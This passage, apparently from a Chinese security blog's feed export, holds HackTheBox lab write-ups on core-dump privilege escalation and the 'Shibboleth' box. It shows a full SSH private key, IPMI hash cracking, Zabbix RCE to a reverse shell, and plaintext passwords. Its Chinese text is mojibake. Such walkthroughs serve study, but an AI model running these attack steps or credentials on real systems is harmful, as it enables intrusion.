class="line">            <span class="built_in">printf</span>((fstat.st_mode &amp; S_IXOTH) ? <span class="string">&quot;x&quot;</span> : <span class="string">&quot;-&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;??????????&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span> (<span class="string">&quot;\t%s\n&quot;</span>, ent-&gt;d_name);</span><br><span class="line">    &#125;</span><br><span class="line">    closedir(dir);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">snprintf</span>(summary, <span class="number">4096</span>, <span class="string">&quot;Total entries       = %d\nRegular files       = %d\nDirectories         = %d\nSymbolic links      = %d\n&quot;</span>, tot, regular_files, directories, symlinks);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%s&quot;</span>, summary);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">filecount</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path, <span class="keyword">char</span> *summary)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *file;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    <span class="keyword">int</span> characters, words, lines;</span><br><span class="line"></span><br><span class="line">    file = fopen(path, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nUnable to open file.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Please check if file exists and you have read privilege.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    characters = words = lines = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ((ch = fgetc(file)) != EOF)</span><br><span class="line">    &#123;</span><br><span class="line">        characters++;</span><br><span class="line">        <span class="keyword">if</span> (ch == <span class="string">&#x27;\n&#x27;</span> || ch == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">            lines++;</span><br><span class="line">        <span class="keyword">if</span> (ch == <span class="string">&#x27; &#x27;</span> || ch == <span class="string">&#x27;\t&#x27;</span> || ch == <span class="string">&#x27;\n&#x27;</span> || ch == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">            words++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (characters &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        words++;</span><br><span class="line">        lines++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">snprintf</span>(summary, <span class="number">256</span>, <span class="string">&quot;Total characters = %d\nTotal words      = %d\nTotal lines      = %d\n&quot;</span>, characters, words, lines);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%s&quot;</span>, summary);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> path[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> res;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">path_s</span>;</span></span><br><span class="line">    <span class="keyword">char</span> summary[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter source file/directory name: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%99s&quot;</span>, path);</span><br><span class="line">    getchar();</span><br><span class="line">    stat(path, &amp;path_s);</span><br><span class="line">    <span class="keyword">if</span>(S_ISDIR(path_s.st_mode))</span><br><span class="line">        dircount(path, summary);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        filecount(path, summary);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// drop privs to limit file write</span></span><br><span class="line">    setuid(getuid());</span><br><span class="line">    <span class="comment">// Enable coredump generation</span></span><br><span class="line">    prctl(PR_SET_DUMPABLE, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Save results a file? [y/N]: &quot;</span>);</span><br><span class="line">    res = getchar();</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="number">121</span> || res == <span class="number">89</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Path: &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%99s&quot;</span>, path);</span><br><span class="line">        FILE *fp = fopen(path, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (fp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">fputs</span>(summary, fp);</span><br><span class="line">            fclose(fp);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Could not open %s for writing\n&quot;</span>, path);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¸Šè¿°ä»£ç æ˜¯æŒ‡åœ¨ä»£ç ä¸­å¯ç”¨æ ¸å¿ƒè½¬å‚¨ï¼Œè¿™æœ‰åŠ©äºåˆ†æå´©æºƒè½¬å‚¨ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦è·å–ä¸¤ä¸ªshellï¼Œå…·ä½“å‚è€ƒèµ„æ–™<a href="https://man7.org/linux/man-pages/man2/prctl.2.html">https://man7.org/linux/man-pages/man2/prctl.2.html</a>ã€‚æˆ‘ä»¬é¦–å…ˆå…ˆè¿è¡Œè¿™ä¸ªcountæ–‡ä»¶ï¼Œå¹¶è¾“å…¥ç›¸å¯¹åº”çš„å‚æ•°å€¼ï¼Œç›®çš„æ˜¯è·å–åˆ°rootçš„sshå¯†é’¥<br><img src="https://img-blog.csdnimg.cn/646aaa231c9849b0b991774b4b2542ad.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬åœ¨å¦ä¸€ä¸ªç»ˆç«¯ä¸Šç»“æŸè¿™ä¸ªè¿›ç¨‹ï¼Œå®ƒä¼šç”Ÿæˆä¸€ä¸ªæ—¥å¿—æ–‡ä»¶ã€‚é€šè¿‡ä½¿ç”¨ apport-unpack æˆ‘ä»¬å¯ä»¥è½»æ¾è°ƒè¯•ç¨‹åºçš„å´©æºƒã€‚æ‰€æœ‰çš„å´©æºƒæ•°æ®éƒ½å­˜å‚¨åœ¨è½¬å‚¨ç›®å½•ä¸‹ï¼ŒCoreDump æœ‰æˆ‘ä»¬éœ€è¦çš„ä¿¡æ¯ã€‚<br><img src="https://img-blog.csdnimg.cn/12396e7ff8884666860801df4d99273f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAYEAn6zLlm7QOGGZytUCO3SNpR5vdDfxNzlfkUw4nMw/hFlpRPaKRbi3</span><br><span class="line">KUZsBKygoOvzmhzWYcs413UDJqUMWs+o9Oweq0viwQ1QJmVwzvqFjFNSxzXEVojmoCePw+</span><br><span class="line">7wNrxitkPrmuViWPGQCotBDCZmn4WNbNT0kcsfA+b4xB+am6tyDthqjfPJngROf0Z26lA1</span><br><span class="line">xw0OmoCdyhvQ3azlbkZZ7EWeTtQ/EYcdYofa8/mbQ+amOb9YaqWGiBai69w0Hzf06lB8cx</span><br><span class="line">8G+KbGPcN174a666dRwDFmbrd9nc9E2YGn5aUfMkvbaJoqdHRHGCN1rI78J7rPRaTC8aTu</span><br><span class="line">BKexPVVXhBO6+e1htuO31rHMTHABt4+6K4wv7YvmXz3Ax4HIScfopVl7futnEaJPfHBdg2</span><br><span class="line">5yXbi8lafKAGQHLZjD9vsyEi5wqoVOYalTXEXZwOrstp3Y93VKx4kGGBqovBKMtlRaic+Y</span><br><span class="line">Tv0vTW3fis9d7aMqLpuuFMEHxTQPyor3+/aEHiLLAAAFiMxy1SzMctUsAAAAB3NzaC1yc2</span><br><span class="line">EAAAGBAJ+sy5Zu0DhhmcrVAjt0jaUeb3Q38Tc5X5FMOJzMP4RZaUT2ikW4tylGbASsoKDr</span><br><span class="line">85oc1mHLONd1AyalDFrPqPTsHqtL4sENUCZlcM76hYxTUsc1xFaI5qAnj8Pu8Da8YrZD65</span><br><span class="line">rlYljxkAqLQQwmZp+FjWzU9JHLHwPm+MQfmpurcg7Yao3zyZ4ETn9GdupQNccNDpqAncob</span><br><span class="line">0N2s5W5GWexFnk7UPxGHHWKH2vP5m0Pmpjm/WGqlhogWouvcNB839OpQfHMfBvimxj3Dde</span><br><span class="line">+GuuunUcAxZm63fZ3PRNmBp+WlHzJL22iaKnR0RxgjdayO/Ce6z0WkwvGk7gSnsT1VV4QT</span><br><span class="line">uvntYbbjt9axzExwAbePuiuML+2L5l89wMeByEnH6KVZe37rZxGiT3xwXYNucl24vJWnyg</span><br><span class="line">BkBy2Yw/b7MhIucKqFTmGpU1xF2cDq7Lad2Pd1SseJBhgaqLwSjLZUWonPmE79L01t34rP</span><br><span class="line">Xe2jKi6brhTBB8U0D8qK9/v2hB4iywAAAAMBAAEAAAGAGkWVDcBX1B8C7eOURXIM6DEUx3</span><br><span class="line">t43cw71C1FV08n2D/Z2TXzVDtrL4hdt3srxq5r21yJTXfhd1nSVeZsHPjz5LCA71BCE997</span><br><span class="line">44VnRTblCEyhXxOSpWZLA+jed691qJvgZfrQ5iB9yQKd344/+p7K3c5ckZ6MSvyvsrWrEq</span><br><span class="line">Hcj2ZrEtQ62/ZTowM0Yy6V3EGsR373eyZUT++5su+CpF1A6GYgAPpdEiY4CIEv3lqgWFC3</span><br><span class="line">4uJ/yrRHaVbIIaSOkuBi0h7Is562aoGp7/9Q3j/YUjKBtLvbvbNRxwM+sCWLasbK5xS7Vv</span><br><span class="line">D569yMirw2xOibp3nHepmEJnYZKomzqmFsEvA1GbWiPdLCwsX7btbcp0tbjsD5dmAcU4nF</span><br><span class="line">JZI1vtYUKoNrmkI5WtvCC8bBvA4BglXPSrrj1pGP9QPVdUVyOc6QKSbfomyefO2HQqne6z</span><br><span class="line">y0N8QdAZ3dDzXfBlVfuPpdP8yqUnrVnzpL8U/gc1ljKcSEx262jXKHAG3mTTNKtooZAAAA</span><br><span class="line">wQDPMrdvvNWrmiF9CSfTnc5v3TQfEDFCUCmtCEpTIQHhIxpiv+mocHjaPiBRnuKRPDsf81</span><br><span class="line">ainyiXYooPZqUT2lBDtIdJbid6G7oLoVbx4xDJ7h4+U70rpMb/tWRBuM51v9ZXAlVUz14o</span><br><span class="line">Kt+Rx9peAx7dEfTHNvfdauGJL6k3QyGo+90nQDripDIUPvE0sac1tFLrfvJHYHsYiS7hLM</span><br><span class="line">dFu1uEJvusaIbslVQqpAqgX5Ht75rd0BZytTC9Dx3b71YYSdoAAADBANMZ5ELPuRUDb0Gh</span><br><span class="line">mXSlMvZVJEvlBISUVNM2YC+6hxh2Mc/0Szh0060qZv9ub3DXCDXMrwR5o6mdKv/kshpaD4</span><br><span class="line">Ml+fjgTzmOo/kTaWpKWcHmSrlCiMi1YqWUM6k9OCfr7UTTd7/uqkiYfLdCJGoWkehGGxep</span><br><span class="line">lJpUUj34t0PD8eMFnlfV8oomTvruqx0wWp6EmiyT9zjs2vJ3zapp2HWuaSdv7s2aF3gibc</span><br><span class="line">z04JxGYCePRKTBy/kth9VFsAJ3eQezpwAAAMEAwaLVktNNw+sG/Erdgt1i9/vttCwVVhw9</span><br><span class="line">RaWN522KKCFg9W06leSBX7HyWL4a7r21aLhglXkeGEf3bH1V4nOE3f+5mU8S1bhleY5hP9</span><br><span class="line">6urLSMt27NdCStYBvTEzhB86nRJr9ezPmQuExZG7ixTfWrmmGeCXGZt7KIyaT5/VZ1W7Pl</span><br><span class="line">xhDYPO15YxLBhWJ0J3G9v6SN/YH3UYj47i4s0zk6JZMnVGTfCwXOxLgL/w5WJMelDW+l3k</span><br><span class="line">fO8ebYddyVz4w9AAAADnJvb3RAbG9jYWxob3N0AQIDBA==</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬æ‹¿åˆ°sshçš„rootå¯†é’¥åï¼Œå°±å¯ä»¥å°è¯•è¿æ¥rootç”¨æˆ·äº†<br><img src="https://img-blog.csdnimg.cn/b2efd44d61e04cbfad3fe15f865131fe.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™ä¸ªé¶æœºè¿˜æ˜¯ç›¸å½“å‡ºè‰²çš„ä¸€ä¸ªé¶æœºï¼Œå®ƒä¸»è¦è€ƒæŸ¥äº†ä»£ç å®¡è®¡çš„èƒ½åŠ›ï¼Œä»£ç åŒ…å«äº†jsï¼Œcè¿™äº›é«˜çº§çš„ç¼–ç¨‹è¯­è¨€ï¼Œå‰æœŸæ‹¿å–webshellä¸»è¦è€ƒæŸ¥äº†jså‰ç«¯çš„ä»£ç å®¡è®¡èƒ½åŠ›ï¼ŒåæœŸææƒæ˜¯æ ¸å¿ƒè½¬å‚¨ï¼Œè¿™ä¸ªè¦æ±‚çœŸçš„å¾ˆé«˜äº†ï¼Œè¿™ä¸ªé¶æœºæˆ‘è§‰å¾—åº”è¯¥è®¾ç½®ä¸ºMediuméš¾åº¦ï¼Œä½†æ˜¯å®ƒç¡®å®Easyï¼Œæœ‰ç‚¹æ„å¤–ã€‚</p>
]]></content>
      <categories>
        <category>ä»£ç å®¡è®¡</category>
      </categories>
      <tags>
        <tag>HackThebox</tag>
      </tags>
  </entry>
  <entry>
    <title>Shibboleth</title>
    <url>/2022/01/13/Shibboleth/</url>
    <content><![CDATA[<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>åªåšä¸€ä¸ªç®€å•çš„æ‰«æï¼Œå‘ç°åªå¼€æ”¾äº†webæœåŠ¡<br><img src="https://img-blog.csdnimg.cn/97c60e806c6d413eb3524efdf5cbdb9c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/19faecaea42a449ba7cf1bc2244db896.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>fuzzäº†ä¸€ä¸‹è·¯å¾„ï¼Œå¹¶æ²¡æœ‰å‘ç°ä»»ä½•æœ‰ä»·å€¼çš„è·¯å¾„ä¿¡æ¯<br><img src="https://img-blog.csdnimg.cn/7d1c7ad510a74a089d925f6c3b674ead.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<span id="more"></span>

<p>æˆ‘ä»¬å°†æ€è·¯è½¬æ¢åˆ°å­åŸŸåæŒ–æ˜ä¸Šï¼Œå‘ç°äº†ä¸‰ä¸ªå­åŸŸï¼Œæˆ‘ä»¬å°†å®ƒä»¬é€ä¸€è®¿é—®çš„æ—¶å€™å‘ç°éƒ½åŒæ—¶æŒ‡å‘åŒä¸€ä¸ªç™»å½•é¡µé¢</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wfuzz -c -u <span class="string">&quot;http://shibboleth.htb&quot;</span> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 26 -H <span class="string">&quot;HOST:FUZZ.shibboleth.htb&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/520287b9831e4eafa7e8f56cb80b2463.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/5cd36cb1f22d4ffc97f718b00a6170eb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>æˆ‘ä»¬å¯¹è¿™ä¸ªè¡¨å•è¿›è¡ŒSQLæ³¨å…¥æ¼æ´çš„æ£€æµ‹æ—¶ï¼Œå¹¶æ²¡æœ‰å‘ç°å­˜åœ¨æ³¨å…¥ï¼Œä¹Ÿæ²¡æœ‰å‘ç°å¯¹åº”çš„ä¸­é—´ä»¶æ¼æ´ï¼Œåˆ°è¿™é‡Œæˆ‘çš„æ€è·¯æ–­äº†ã€‚æˆ‘åœ¨åæ€å®ƒæ˜¯ä¸ªé¶åœºè‚¯å®šæ˜¯æœ‰æ¼æ´ç‚¹çš„ï¼Œå¯èƒ½æ˜¯æˆ‘ä¿¡æ¯æ”¶é›†é‚£å—åšå¾—ä¸å¤Ÿç»†è‡´ã€‚å› æ­¤æˆ‘å¯¹é¶åœºè¿›è¡ŒUDPç«¯å£çš„æ‰«æï¼ŒæŸ¥çœ‹æ˜¯å¦å­˜åœ¨æ¼æ‰«çš„åœ°æ–¹ã€‚æ‰«ææ—¶å‘ç°å¼€æ”¾äº†623ç«¯å£çš„asf-rmcpæœåŠ¡<br><img src="https://img-blog.csdnimg.cn/8d6296236bc149bb9e96a7c0219733f9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<!--more-->

<p>åœ¨æœç´¢å¼•æ“ä¸Šæœç´¢æ—¶ï¼Œå‘ç°äº†å¯¹åº”çš„æ¼æ´åˆ©ç”¨å¤ç°ã€‚æ¼æ´åˆ©ç”¨çš„æ–¹å¼æ˜¯ä½¿ç”¨MSFæ¡†æ¶çš„å¯¹åº”æ¨¡å—è¿›è¡Œæ¼æ´çš„æ£€æµ‹<br><img src="https://img-blog.csdnimg.cn/c1bceb8bee654c4d82f8bd3ecd59c2a9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/53abaaec2bdc4593a1cc5de0b865f47e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è®¾ç½®å¥½å¯¹åº”çš„å‚æ•°åï¼Œå‘ç°IPMIçš„ç‰ˆæœ¬æ˜¯2.0<br><img src="https://img-blog.csdnimg.cn/5430d56678624006bcb42e414ff0a16e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£æˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨ä¸‹è½½å“ˆå¸Œçš„æ¨¡å—ï¼Œå°è¯•èƒ½å¦å°†ç”¨æˆ·å¯¹åº”çš„hashå€¼ä¸‹è½½ä¸‹æ¥ã€‚æˆ‘ä»¬å‘ç°å¯¹åº”çš„ç®¡ç†å‘˜çš„å“ˆå¸Œå€¼ï¼Œæˆ‘ä»¬å¯ä»¥å°†å“ˆå¸Œå€¼ä¿å­˜ä¸‹æ¥ï¼Œä½¿ç”¨hashcatè¿›è¡Œå¯†ç ç ´è§£ï¼Œå› ä¸ºå¯¹åº”çš„åŠ å¯†æ–¹å¼æ˜¯IPMIï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç­›é€‰ä¸€ä¸‹<img src="https://img-blog.csdnimg.cn/8ddb20fb646844cb8c2c59c9be1da693.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¯¹åº”çš„ç¼–å·æ˜¯7300ï¼Œè§£å¯†å‡ºæ¥çš„å¯†ç æ˜¯<code>ilovepumkinpie1</code>ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 7300 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/9d0ed66d101f41c593497ac9adc49a27.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/8bba274825dc42cba553281a16464f09.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å¯ä»¥æ‹¿è¿™ä¸ªè´¦å·å¯†ç ç™»å½•è¿›zabbixçš„ç®¡ç†å‘˜é¡µé¢<br><img src="https://img-blog.csdnimg.cn/85d21ce1938d44168a00a9fbfc97ee33.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŸ¥é˜…å¯¹åº”çš„æ¼æ´å¤ç°æ–‡ç« å‘ç°ï¼Œåœ¨Configurationçš„hostså¤„ï¼Œå¯ä»¥æ·»åŠ å¯¹åº”çš„è„šæœ¬ï¼Œå®ç°RCEæ¼æ´çš„æ‰§è¡Œ<br><img src="https://img-blog.csdnimg.cn/aa4967975c894ae188bd13955e787130.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/99a13f40d5a6484dac50075d8cf77c10.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/b9ceff97b59546599dedd240624fca25.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬åœ¨keyå¤„æ·»åŠ æˆ‘ä»¬è¦æ‰§è¡Œçš„RCEä»£ç å†…å®¹ï¼Œç‚¹å‡»æ·»åŠ å¹¶æ‰§è¡Œï¼ŒæœŸé—´æˆ‘ä»¬å¼€å¯å¯¹åº”çš„ç›‘å¬ç«¯å£ï¼Œå¯ä»¥åå¼¹ä¸€ä¸ªshellåˆ°æœ¬åœ°ç»ˆç«¯ä¸Š<br><img src="https://img-blog.csdnimg.cn/89a3911aa36b420887970de69515048e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/c0622899df61434e924f6d2b2b2ab3b2.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>æˆ‘ä»¬ç¡®å®æ˜¯è·å¾—äº†ä¸€ä¸ªç»ˆç«¯ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰æƒé™æŸ¥çœ‹åˆ°user.txtçš„å†…å®¹ï¼Œæˆ‘ä»¬å¾—æƒ³åŠæ³•ææƒåˆ°ipmi-svcè¿™ä¸ªè´¦æˆ·çš„æƒé™ä¸Š<br><img src="https://img-blog.csdnimg.cn/b4b5288c956948ba9dd4b917f5396c02.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬ä¸‹æ„è¯†å¯ä»¥å°è¯•ï¼Œä½¿ç”¨Administratorè´¦æˆ·çš„å¯†ç çœ‹çœ‹æ˜¯å¦èƒ½æˆåŠŸã€‚ä»¤äººå¾ˆæ„å¤–çš„æ˜¯ï¼Œå±…ç„¶æˆåŠŸäº†<br><img src="https://img-blog.csdnimg.cn/586fc07ad39344f8858fd00d7dbdb3d1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£ä¸‹ä¸€æ­¥å°±æ˜¯æ‹¿å–rootæƒé™äº†ï¼Œæˆ‘ä¸Šä¼ äº†ä¸ªlinpeas.shè„šæœ¬åˆ°ç›®æ ‡ä¸»æœºä¸Šè¿›è¡Œæ£€æŸ¥ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰å‘ç°ä»»ä½•æœ‰ä»·å€¼çš„ä¿¡æ¯ã€‚ä½†æ˜¯æˆ‘ä»¬æŸ¥çœ‹æœ¬åœ°çš„ç«¯å£æ—¶ï¼Œå‘ç°å¼€æ”¾äº†mysqlæœåŠ¡<br><img src="https://img-blog.csdnimg.cn/1cabb3c6e28b43f5a42c5b3bb9d2e9c8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬è¿›å…¥åˆ°zabbixçš„ç›®å½•ä¸Šï¼Œç­›é€‰ä¿¡æ¯å‘ç°äº†æ•°æ®åº“çš„å¯†ç ä¸º<code>bloooarskybluh</code>ï¼Œç”¨æˆ·åä¸º<code>zabbix</code><br><img src="https://img-blog.csdnimg.cn/2423387ead4747a28f952d7b47bab881.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img 